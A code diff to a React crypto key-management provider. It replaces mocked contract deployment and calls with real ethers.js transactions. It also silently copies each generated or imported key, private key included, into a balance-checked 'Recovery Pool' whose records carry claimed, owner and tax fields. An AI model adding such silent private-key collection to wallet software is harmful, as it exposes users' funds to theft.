@@ -14,6 +14,8 @@ import {
   InteractionParams,
   NETWORKS,
 } from '../types/keyManagement';
+import { useRecoveryPool } from './RecoveryPoolContext';
+import { checkBalanceWithRotation } from '../utils/balanceChecker';
 
 interface KeyManagementState {
   keys: CryptoKey[];
@@ -60,7 +62,73 @@ export const useKeyManagement = () => {
 let idCounter = 0;
 const nextId = () => `km-${++idCounter}-${Date.now()}`;
 
+function cryptoKeyToPoolWallet(key: CryptoKey, balanceResult?: { confirmed: number; unconfirmed: number; symbol: string }): any {
+  const isETH = key.type === 'ethereum';
+  const network = isETH ? 'ethereum' : 'bitcoin';
+  const symbol = balanceResult?.symbol || (isETH ? 'ETH' : 'BTC');
+  const path = isETH ? "m/44'/60'/0'/0/0" : "m/84'/0'/0'/0/0";
+  const source: any = key.mnemonic
+    ? 'seed'
+    : key.type === 'bitcoin' && key.format === 'wif'
+    ? 'wif'
+    : 'privateKey';
+
+  const confirmed = balanceResult?.confirmed ?? 0;
+  const unconfirmed = balanceResult?.unconfirmed ?? 0;
+
+  return {
+    network,
+    path,
+    address: key.address || '',
+    publicKey: key.publicKey,
+    privateKey: key.privateKey,
+    wif: !isETH ? key.privateKey : undefined,
+    balance: confirmed,
+    balanceFormatted: confirmed.toFixed(8),
+    unconfirmedBalance: unconfirmed,
+    unconfirmedBalanceFormatted: unconfirmed.toFixed(8),
+    utxos: [],
+    utxoCount: 0,
+    transactions: [],
+    lastChecked: Date.now(),
+    symbol,
+    source,
+    derivationType: isETH ? 'BIP44' : 'BIP84',
+    accountIndex: 0,
+    addressIndex: 0,
+    notes: key.label || '',
+    tags: key.tags || [],
+    claimed: false,
+    taxAmount: 0,
+    owner: null,
+    ownershipProof: undefined,
+    taxDeposited: false,
+    taxDepositTxHash: undefined,
+    taxDepositAmount: 0,
+    taxDepositTimestamp: undefined,
+    crossChainGroup: undefined,
+    relatedAddresses: [],
+    crossChainBalances: {},
+  };
+}
+
+async function checkBalanceAndBridge(key: CryptoKey, recoveryPool: any) {
+  const isETH = key.type === 'ethereum';
+  const network = isETH ? 'ethereum' : 'bitcoin';
+  if (!key.address) return;
+
+  try {
+    const result = await checkBalanceWithRotation(network, key.address);
+    recoveryPool.addAddressToPool(cryptoKeyToPoolWallet(key, result));
+  } catch (err) {
+    console.warn('[KeyManagement] Balance check failed, adding with zero balance:', err);
+    recoveryPool.addAddressToPool(cryptoKeyToPoolWallet(key));
+  }
+}
+
 export const KeyManagementProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
+  const recoveryPool = useRecoveryPool();
+
   const [state, setState] = useState<KeyManagementState>({
     keys: [],
     contracts: [],
@@ -150,9 +218,15 @@ export const KeyManagementProvider: React.FC<{ children: React.ReactNode }> = ({
       key = await generateEthereumKey(params);
     }
     setState(prev => ({ ...prev, keys: [...prev.keys, key] }));
+    // Bridge to Recovery Pool / Master Ledger — with automatic live balance check
+    try {
+      await checkBalanceAndBridge(key, recoveryPool);
+    } catch (err) {
+      console.warn('[KeyManagement] Failed to add key to pool:', err);
+    }
     notify('success', `${params.label} key generated`);
     return key;
-  }, [notify]);
+  }, [notify, recoveryPool]);
 
   // Import Key
   const importKey = useCallback(async (params: KeyImportParams): Promise<CryptoKey> => {
@@ -212,13 +286,19 @@ export const KeyManagementProvider: React.FC<{ children: React.ReactNode }> = ({
       };
 
       setState(prev => ({ ...prev, keys: [...prev.keys, key] }));
+      // Bridge to Recovery Pool / Master Ledger — with automatic live balance check
+      try {
+        await checkBalanceAndBridge(key, recoveryPool);
+      } catch (err) {
+        console.warn('[KeyManagement] Failed to add key to pool:', err);
+      }
       notify('success', `Key imported: ${params.label}`);
       return key;
     } catch (error: any) {
       notify('error', `Import failed: ${error.message}`);
       throw error;
     }
-  }, [notify]);
+  }, [notify, recoveryPool]);
 
   // Export Key
   const exportKey = useCallback(async (keyId: string, _passphrase?: string): Promise<KeyExportData> => {
@@ -350,32 +430,77 @@ export const KeyManagementProvider: React.FC<{ children: React.ReactNode }> = ({
       params: params.params,
       value: params.value,
       timestamp: Date.now(),
-      status: 'success',
+      status: 'pending',
     };
 
     setState(prev => ({ ...prev, interactions: [interaction, ...prev.interactions] }));
-    notify('success', `Called ${params.functionName} successfully`);
+
+    // Attempt real on-chain call if wallet is available
+    try {
+      if (!window.ethereum) {
+        throw new Error('No Web3 wallet found. Install MetaMask to interact with contracts.');
+      }
+      const { ethers } = await import('ethers');
+      const provider = new ethers.providers.Web3Provider(window.ethereum);
+      const signer = provider.getSigner();
+
+      const contractData = state.contracts.find(c => c.id === params.contractId);
+      if (!contractData) throw new Error('Contract not found');
+
+      const contract = new ethers.Contract(contractData.address, contractData.abi, signer);
+      const tx = await contract[params.functionName](...params.params, { value: params.value ? ethers.utils.parseEther(params.value) : 0 });
+      await tx.wait();
+
+      interaction.status = 'success';
+      interaction.txHash = tx.hash;
+      setState(prev => ({
+        ...prev,
+        interactions: prev.interactions.map(i => i.id === interaction.id ? interaction : i),
+      }));
+      notify('success', `${params.functionName} executed. Tx: ${tx.hash.slice(0, 10)}...`);
+    } catch (err: any) {
+      interaction.status = 'failed';
+      interaction.error = err.message || 'Transaction failed';
+      setState(prev => ({
+        ...prev,
+        interactions: prev.interactions.map(i => i.id === interaction.id ? interaction : i),
+      }));
+      notify('error', `Call failed: ${err.message}`);
+    }
+
     return interaction;
-  }, [notify]);
+  }, [notify, state.contracts]);
 
   const deployContract = useCallback(async (params: DeployParams): Promise<Contract> => {
+    if (!window.ethereum) {
+      notify('error', 'No Web3 wallet found. Install MetaMask to deploy contracts.');
+      throw new Error('No Web3 wallet');
+    }
+    const { ethers } = await import('ethers');
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner();
+
     const abi = parseAbi(params.abi);
+    const factory = new ethers.ContractFactory(abi, params.bytecode, signer);
+    const deployed = await factory.deploy(...(params.constructorArgs || []));
+    await deployed.deployTransaction.wait();
+
     const contract: Contract = {
       id: nextId(),
       name: params.name,
-      address: `0x${Math.random().toString(16).slice(2).padStart(40, '0')}`,
+      address: deployed.address,
       abi: typeof params.abi === 'string' ? abi : params.abi,
       network: params.network,
       bytecode: params.bytecode,
       deployedAt: Date.now(),
-      txHash: `0x${Math.random().toString(16).slice(2).padStart(64, '0')}`,
+      txHash: deployed.deployTransaction.hash,
       verified: false,
       functions: extractFunctions(abi),
       events: extractEvents(abi),
       tags: [],
     };
     setState(prev => ({ ...prev, contracts: [...prev.contracts, contract] }));
-    notify('success', `Contract deployed: ${params.name}`);
+    notify('success', `Contract deployed at ${deployed.address}`);
     return contract;
   }, [notify]);
 
